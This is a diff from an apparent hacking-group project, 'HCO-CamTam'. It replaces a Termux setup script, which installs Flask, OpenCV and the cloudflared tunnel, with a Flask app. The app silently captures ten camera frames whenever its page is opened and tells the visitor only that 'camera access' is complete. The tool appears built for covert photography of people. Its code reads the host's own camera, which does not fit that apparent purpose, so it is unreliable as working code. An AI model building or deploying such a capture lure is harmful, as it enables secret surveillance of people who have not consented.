@@ -1,24 +1,40 @@
-#!/bin/bash
-# HCO CamTam one-click install by Azhar
+#!/usr/bin/env python3
+"""
+HCO-CamTam - Camera Tool
+By Azhar (Hackers Colony)
+"""
 
-echo -e "\033[1;32m[+] Updating Termux packages...\033[0m"
-pkg update -y && pkg upgrade -y
+import os
+import cv2
+from flask import Flask, Response
+from datetime import datetime
 
-echo -e "\033[1;32m[+] Installing required packages...\033[0m"
-pkg install python git clang libjpeg-turbo fftw wget tar -y
+app = Flask(__name__)
+CAPTURE_DIR = "captures"
+TOTAL_IMAGES = 10
 
-echo -e "\033[1;32m[+] Upgrading pip...\033[0m"
-pip install --upgrade pip
+# Make sure captures/ exists
+os.makedirs(CAPTURE_DIR, exist_ok=True)
 
-echo -e "\033[1;32m[+] Installing Python packages (Flask + OpenCV)...\033[0m"
-# Using pre-built OpenCV wheel to avoid compilation
-pip install flask==3.1.1 opencv-python-headless==4.5.5.64 --no-cache-dir --prefer-binary
+def gen_frames():
+    cam = cv2.VideoCapture(0)  # 0 = front camera (usually works for mobiles/laptops)
+    count = 0
+    while count < TOTAL_IMAGES:
+        success, frame = cam.read()
+        if not success:
+            break
+        else:
+            filename = os.path.join(CAPTURE_DIR, f"img_{count+1}.jpg")
+            cv2.imwrite(filename, frame)
+            count += 1
+    cam.release()
+    print(f"[✔] {TOTAL_IMAGES} images received and saved in {CAPTURE_DIR}/")
 
-echo -e "\033[1;32m[+] Installing Cloudflared...\033[0m"
-wget -O cloudflared.tgz https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-arm64.tgz
-tar -xvzf cloudflared.tgz
-chmod +x cloudflared
-mv cloudflared /data/data/com.termux/files/usr/bin/
+@app.route('/')
+def index():
+    gen_frames()
+    return "<h2>Camera access complete. You may close this page.</h2>"
 
-echo -e "\033[1;33m[!] Setup complete!\033[0m"
-echo -e "\033[1;34mRun the tool with:\033[0m python main.py"
+if __name__ == "__main__":
+    print("[*] Flask server started on http://127.0.0.1:5000")
+    app.run(host="0.0.0.0", port=5000)
